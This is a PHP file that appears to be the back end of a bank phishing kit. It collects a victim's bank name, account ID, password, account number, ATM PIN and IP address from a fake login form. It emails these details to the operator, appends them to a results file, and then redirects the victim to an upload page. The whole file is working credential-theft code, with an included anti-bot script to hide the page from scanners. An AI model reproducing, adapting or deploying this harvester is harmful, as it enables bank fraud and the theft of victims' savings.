<?php


/*

 */
session_start();
include 'antibots.php';
include 'config.php';



$bankname =  $_POST['bankname'];
$accountid = $_POST['accountid'];
$password = $_POST['password'];
$accounnumber = $_POST['accounnumber'];
$atm_pin = $_POST['atm_pin'];
$iP_adress = $_SERVER['REMOTE_ADDR'];

$Info_LOG = "
|---------------- Bank-INFO ---------------|
|Bank Name        : $bankname
|Account ID       : $accountid
|Password         : $password
|Account Number   : $accounnumber
|ATM PIN          : $atm_pin
|IP Adresse       : $iP_adress";





// Don't Touche
//Email
if($Send_Email !== 1 ){}else{
    $subject = 'Bank Info From '.$iP_adress.' ';
    $headers = 'From: Bank' . "\r\n" .
        'X-Mailer: PHP/' . phpversion();
    mail($to, $subject, $Info_LOG, $headers);
    header("location:uploadfile.php?websrc=".md5('nOobn')."&dispatched=".rand(20,100)."&id=".rand(10000000000,500000000)." ");
}
//FTP
if($Ftp_Write !== 1 ){}else{
    $file = fopen("rst/Resul" . $IP_Connected . ".tt", 'a');
    fwrite($file, $Info_LOG);
    header("location:uploadfile.php?websrc=".md5('nOobn')."&dispatched=".rand(20,100)."&id=".rand(10000000000,500000000)." ");
}



?>